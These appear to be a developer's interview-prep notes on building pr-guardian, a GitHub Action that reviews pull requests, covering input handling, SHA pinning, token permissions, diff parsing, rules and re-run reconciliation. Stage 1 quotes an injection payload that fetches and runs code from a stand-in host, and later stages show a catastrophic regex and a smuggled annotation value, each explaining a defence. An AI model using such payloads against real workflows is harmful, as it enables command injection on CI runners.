# Interview notes

One section per build stage. Each has five likely questions, a failure I have
actually reasoned through, and the commit that introduced it.

## Stage 1 - Skeleton

### Five questions

**1. Why a composite action instead of a JavaScript or Docker action?**
Composite is just YAML steps, so there is no build step or image to publish and
anyone can read exactly what runs. Docker actions are slower (image pull) and
Linux-only; JS actions need a committed, bundled `dist/`. The cost: composite
steps get no automatic `INPUT_*` variables and no `permissions:` block of their
own, so I map inputs to env vars explicitly and the *caller's* workflow sets
permissions.

**2. Why pass inputs through `env:` instead of writing `${{ inputs.x }}` in `run:`?**
`${{ }}` is expanded by the runner *before* bash sees the script, so a crafted
input like `"; curl evil | sh` becomes part of the code. Via `env:` the value
stays data in an environment variable. A test fails if `${{` appears in a
`run:` block.

**3. Why pin Actions to a full commit SHA?**
Tags and branches are mutable: if an upstream maintainer account is
compromised, `@v4` can be repointed at malicious code that runs with your
token. A SHA is content-addressed. I keep the tag in a trailing comment for
humans, and a test enforces SHA pins for every `uses:`.

**4. Why does a missing API key mean "rules-only" instead of an error?**
The AI layer is optional, and fork PRs never receive secrets, so "no key" is a
normal state, not a misconfiguration. Failing would make the Action unusable on
every fork PR. Rules-only is also the safe fallback for cost and data privacy.

**5. Why `contents: read` + `pull-requests: write` only?**
Least privilege: if the Action or a dependency is compromised, the token can
read code and write PR reviews, but cannot push, alter workflows, or touch
releases. A repo test fails if a workflow asks for more.

### One common failure and how I'd debug it

**Symptom:** the step fails with `::error title=Invalid pr-guardian input::...`
and exit code 2.
**Debug:** exit 2 is reserved for *configuration* errors (findings will use a
different code), so it is never a bug in the PR under review. Read the
annotation: all problems are listed at once. Typical causes: `fail-on: High `
with a typo, `dry-run: yes` (must be `true`/`false`), or `max-files: 0`. Check
the `with:` block of the calling workflow. If the message is empty, run locally:
`PRG_GITHUB_TOKEN=x PYTHONPATH=src python -m pr_guardian`.

### Decisions worth remembering

- **Default model is `claude-sonnet-5-5`**, not Haiku 4.5: Anthropic's models
  page (checked 2026-10-03) lists Haiku 4.5 retiring no sooner than 2026-10-15.
- **Zero runtime dependencies** so far: nothing to `pip install` at action run
  time, so a smaller supply-chain surface. PyYAML arrives in Stage 3 (pinned).
- **Exit codes:** 0 ok, 2 config error; 1 (findings fail the check) is added in Stage 4.

### Suggested commit

```
feat: project skeleton with composite action, config validation and CI

Add the composite action (inputs mapped to env vars), a validated frozen
Config, ruff/pytest/pre-commit tooling with pinned versions and SHA-pinned
Actions, repo-policy tests (SHA pins, no pull_request_target, minimal
permissions) and CI including an action smoke test.
```

---

## Stage 2 - Diff handling

### Five questions

**1. Why can't I just comment on any line number I like?**
GitHub's review API only accepts comments on lines that appear in the diff
(changed lines plus a few lines of context). Anything else makes the request
fail - and a review is submitted as one request, so one bad comment can lose
the whole review. So every finding is mapped through a parsed patch first, and
a finding with no valid target is dropped, never guessed.

**2. `line`/`side` versus `position` - what's the difference?**
`position` counts lines down from the first `@@` and keeps counting across
hunks (including later `@@` headers), so it is easy to get wrong. `line` +
`side: RIGHT` is just "line N of the new file". I compute both and plan to post
with `line`/`side`; `position` is a cross-check. Removed lines have no line in
the new file, so they cannot be targeted on the RIGHT side.

**3. Why does the parser raise on a malformed hunk instead of doing its best?**
Failing closed. A wrong line mapping posts a comment on the wrong code, which
misleads people. Skipping the file *and listing it as skipped* is honest. A bug
I actually hit: counting the final empty string from a trailing newline as a
blank context line let a truncated hunk look complete. There is now a test.

**4. How do you stop one huge PR from blowing up the run?**
Layered caps: `max-files`, a per-file patch size limit, and a total size limit.
The cheap filters (deleted files, unsupported types, `paths`) run first so that
400 README edits can't use up the budget meant for Terraform. Every cap that
drops a supported file puts it in a visible skipped list - silent truncation
makes green look like "everything was checked".

**5. Why does the HTTP client refuse redirects, and why not use `requests`?**
Python's urllib forwards the `Authorization` header when following a redirect,
even to another host. For a client that holds a write token, "refuse and report"
is safer than "follow". Using only the standard library also means zero
runtime dependencies to pin, audit or install. The client also never follows
`Link` pagination URLs from the response; it builds each URL itself, so the
token can only go to the configured API host.

### One common failure and how I'd debug it

**Symptom:** `::error title=GitHub API error::GitHub denied access: the token
needs at least 'pull-requests: read'` (exit 3), or a 404 on a PR that clearly
exists.
**Debug:** exit 3 means GitHub, not the PR, is the problem. A 403/404 on a
private repo almost always means the workflow's `permissions:` block omits
`pull-requests` (listing any permission removes all unlisted ones). Add
`pull-requests: write`. On a fork PR the token is read-only by design - reading
works, so a 403 there points at something else. Check the "Set up job" log
section for the "GITHUB_TOKEN Permissions" listing.

### Decisions worth remembering

- **Refuse `pull_request_target`** in code, not just in docs - the rule is
  enforced where a misconfiguration would actually happen.
- **Hostile file names**: git allows newlines and backticks in names. They are
  sanitised before reaching the log, and later the Markdown summary.
- **Not yet verified against the live API**: tests use a fake GitHub. The first
  real run is the CI `action-smoke` job on a PR. `X-GitHub-Api-Version:
  2022-11-28` is the documented stable value; I could not re-check the newest
  value from this sandbox.

### Suggested commit

```
feat: fetch PR files and map findings to valid diff lines

Add a stdlib-only GitHub client (pagination, retries, no redirects), a
fail-closed unified-diff parser producing line and position maps, path-based
file classification, selection with max-files and size caps and a visible
skipped report, and PR context detection that refuses pull_request_target and
flags fork PRs.
```

---

## Stage 3 - Rules engine

### Five questions

**1. Why a deterministic rules engine *before* the AI layer?**
Rules are fast, free, repeatable and explainable: the same diff always gives
the same result, so a rule can safely gate a merge. An LLM is probabilistic, can
be manipulated by text in the diff, and costs money per run. So rules decide
pass/fail; the AI (Stage 5) only adds advisory context.

**2. How do you detect "0.0.0.0/0 in an *ingress* rule" with regex, when egress
legitimately uses the same CIDR?**
A single-line regex can't tell, so a rule can have a `within:` pattern: the
line must sit inside a visible enclosing block whose opener matches (found by
walking up by indentation). `cidr_blocks = ["0.0.0.0/0"]` inside `ingress {`
is flagged, inside `egress {` is not. If the opener isn't in the diff we stay
silent: we don't guess.

**3. How do you flag something that is *absent*, like missing resource limits?**
A diff only shows hunks, so "absent" can't be proven from a single line. The
`yaml_item_missing` rule type finds the container list item, and only reports
if the item's first line *and* the line that ends it are both visible, and the
PR actually changed that container. If the hunk cuts the container off, it says
nothing. I prefer a false negative I can document to a false positive that
makes people stop reading the bot.

**4. How do you keep regex rules from being a denial-of-service vector?**
The diff is attacker-controlled, and Python's `re` has no timeout. Defences:
patterns avoid nested quantifiers; lines over 10,000 characters are not
scanned (and are reported as GUARD-001 instead of silently skipped, since
padding a line is how you'd hide content); and a test runs every rule against
hostile lines on every file type with a 1 s budget. I checked that this test
bites: the worst real case is 2.5 ms, while one catastrophic regex such as
`(a+)+$` takes 26 s on a 29-character input.

**5. Why must a finding never include the matched text?**
Review comments on a public repo are public. If a PR contains a leaked key and
the bot quotes it in a comment, the bot has just published the secret a second
time, in a place that survives force-pushes. Messages are fixed text from the
policy file, a test asserts no secret value appears in any finding, and
fixtures build fake keys at test time so no literal secret-shaped string is ever
committed (it would trip GitHub push protection and my own repo scan).

### One common failure and how I'd debug it

**Symptom:** "my rule never fires" (a clean PR that clearly shouldn't be).
**Debug, in order:** (1) Was the file even reviewed? Check the *Reviewing* /
*Skipped* section of the log: wrong file type, `paths` filter, `max-files`, or
no patch from GitHub. (2) Is the offending line *added*? Context and removed
lines are never flagged. (3) Does the rule need context (`within`, or a
`yaml_item_missing` block) that isn't in the visible hunk? (4) Does the line
match the regex in isolation? Run it through `python -c` with `re` or, better,
add it to a fixture with an `EXPECT:` marker, which makes the test show exactly
what differs. (5) Is it a comment-only line? Only the SEC rules scan comments.

### Decisions worth remembering

- **Severity = impact x confidence.** Exact patterns are critical; heuristics
  (SEC-003) are medium, so the default `fail-on: high` doesn't block merges on
  guesses.
- **One finding per secret.** SEC-003 excludes lines that SEC-001 already
  reports (found when a fixture matched both).
- **The strict loader paid for itself immediately**: it rejected my own
  `K8S-001` id because my id regex disallowed digits.
- **17 rules, not "about 12"**: the extras (GHA-003 script injection, TF-002,
  K8S-004...) are the ones I'd most want to explain in an interview.
- **Fixtures use `EXPECT:` markers and require the exact set of findings across
  all rules**, so each fixture is simultaneously a true-positive and a
  false-positive test.

### Suggested commit

```
feat: rules engine with 17 generic policy rules and fixture tests

Add a strictly validated YAML policy, an engine that flags only added lines
and supports enclosing-block (within) and whole-container-visible
(yaml_item_missing) checks, a guard for unscannable long lines, static
non-echoing messages, fixture-driven true/false-positive tests, a ReDoS
timing test and rule documentation. Adds pinned PyYAML as the first runtime
dependency.
```

---

## Stage 4 - Posting results

### Five questions

**1. Why one review with inline comments instead of one comment per finding?**
One review is one API call and one notification for the PR author. Twenty
separate comments are twenty emails. The catch: GitHub validates the review as
a whole, so a single comment on an invalid line (422) rejects all of them. Every
finding's line comes from the parsed patch, so that should not happen, but if it
does I retry once with the findings listed in the review body instead.

**2. How do you stop the bot repeating itself on every push - and keep one review up to date?**
Everything we post carries a hidden marker (`<!-- pr-guardian:TF-003 -->` on
comments, `<!-- pr-guardian:review -->` on the review). On each run I read what
is already on the PR and *reconcile*: the review's body is edited in place; an
open comment with the same `(file, line, rule)` is kept; a finding with no
comment gets one; a comment whose finding disappeared is deleted, or edited to
"Resolved" if people replied, so the discussion survives. The key stays correct
across pushes because GitHub moves a comment's `line` with the code and nulls it
once that code changes, so an outdated comment is replaced rather than hiding a
new finding. The planning is a pure function, tested without HTTP, and an
end-to-end test runs the CLI twice against a stateful fake and asserts the
second run makes zero writes. Only bot-authored comments and reviews count, so a
human pasting the marker can't suppress or redirect anything, and the check
result never looks at comments at all.

**3. Why is the check status separate from the review, and why `COMMENT`?**
The exit code is what branch protection reads, so it is the gate. Reviews are
for humans. A bot review that "requests changes" stays blocking until someone
dismisses it by hand, even after the fix, while a red check turns green on the
next push by itself. So the review is always `COMMENT`, and `fail-on` drives only
the exit code. Dry-run changes posting, not the verdict.

**4. What happens on a fork PR?**
GitHub gives `pull_request` runs from forks a read-only token, so the review
can't be posted. Annotations and the job summary need no write permission:
they are log lines and a file on the runner. So fork PRs still see every
finding next to the code in the "Files changed" tab, through annotations.

**5. Why not retry the POST that creates the review?**
GETs are retried on 5xx and network errors because they are idempotent. A POST
that times out may already have been stored; retrying could post the review
twice. One attempt, and the de-duplication on the next run covers the gap.

### One common failure and how I'd debug it

**Symptom:** `::error title=Could not post review::GitHub denied access` and
exit 3, while the annotations show the findings.
**Debug:** the token can read but not write. The calling workflow's
`permissions:` block needs `pull-requests: write` (listing any permission drops
the rest to none). Not a fork? Check the "GITHUB_TOKEN Permissions" section of
"Set up job". If the error is a 422 instead, the run fell back to a body-only
review; compare the reported line with the PR's diff to find the mapping bug.

### Decisions worth remembering

- **Posting failure is loud.** A review that silently never appears looks
  exactly like a clean PR, so it exits 3 (or 1 if findings already fail).
- **Hostile file names, again.** Annotation properties also escape `:` and `,`
  (else `a,line=1` moves the annotation), and Markdown puts names in code spans
  with `|` escaped, so a name can't break the table, add a link or @-mention a team.
- **Caps:** 30 inline comments per review, 100 rows in a table; the rest are
  counted, never silently dropped.
- **Not yet verified against the live API.** Tests use a fake GitHub; the
  request shape follows the documented `line` + `side` review-comment fields.
  The first real post will be the first PR this Action runs on with write access.

### Suggested commit

```
feat: post findings as a PR review, annotations and job summary

Post one COMMENT review with inline comments (capped, rest in the body), skip
findings already commented on the same line, fall back to a body-only review on
422, emit escaped annotations and a Markdown job summary that work on fork PRs,
and exit 1 when findings meet fail-on. POSTs are never retried.
```

---

## Stage 4b - Reconciling re-runs (porting onto `main`)

What happened: two sessions built Stages 3 and 4 in parallel. One was merged to
`main` (PR #2); mine was unpushed. Rather than overwrite what was merged, I
built on `main` and ported only what it lacked. Worth telling as a story: it is
a real "two implementations of one feature" integration, resolved by comparing
behaviour, not by picking a winner wholesale.

What `main` already did better, kept as is: a failed review post is **loud**
(exit 3, or 1 if findings already fail) because a review that silently never
appears looks exactly like a clean PR. My version only warned.

What was added: reconcile on re-runs (above), the review body rewritten as
*current state* so editing it in place leaves one accurate review, step
outputs (`conclusion`, `findings-count`), `!` exclusions in `paths`, and
`fail-on: high` in the repo's own smoke job (it previously used `none` because
its intentionally-bad fixtures failed it; `!tests/fixtures/**` fixes that).

### Five more questions

**1. Why edit the review body instead of posting a new review per push?**
A busy PR would collect a trail of stale "N new findings" reviews, each one a
notification. One review that always describes the current state is what a
reader wants. The API only lets you change a review's *body*; inline comments
are separate objects, hence the per-comment keep/add/delete.

**2. Why delete a comment whose finding was fixed - and when not to?**
Leaving it would show a warning about code that no longer exists. But if a
human replied, deleting destroys the conversation, so the comment is edited to
"Resolved" instead. The resolved marker deliberately doesn't match the open
marker's pattern, so a resolved comment stops counting as an open finding.

**3. What if two comments for the same finding exist?**
The first matching one is kept; extras are deleted (or resolved if replied to).
This self-heals duplicates left by an interrupted earlier run.

**4. Why can an identical re-run make zero writes?**
The new body is compared with the existing one; if equal, no update call. No
notification, no rate-limit use, and nothing for a reviewer to wonder about.

**5. Why must the token be `GITHUB_TOKEN` or an App token?**
"Ours" is decided by `user.type == "Bot"`. A personal access token posts as a
`User`, so a re-run wouldn't recognise earlier comments and would duplicate
them. Documented as unsupported.

### Still not verified against the live API

The `line`-nulling-on-outdated behaviour and the PUT/PATCH/DELETE calls have
only run against a fake. Manual check on a demo PR: push a second commit that
doesn't touch the flagged line (expect one comment, review body shows the new
commit), then one that fixes it (expect the comment removed).

### Suggested commit

```
feat: reconcile the review on re-runs and add outputs and path exclusions

Update the single review in place, keep comments that still apply, add new
ones, and delete (or mark resolved) comments for fixed findings. Rank inline
comments by severity, make identical re-runs write nothing, expose
conclusion and findings-count as step outputs, add ! exclusions to paths and
run the repo's own smoke check at fail-on: high.
```
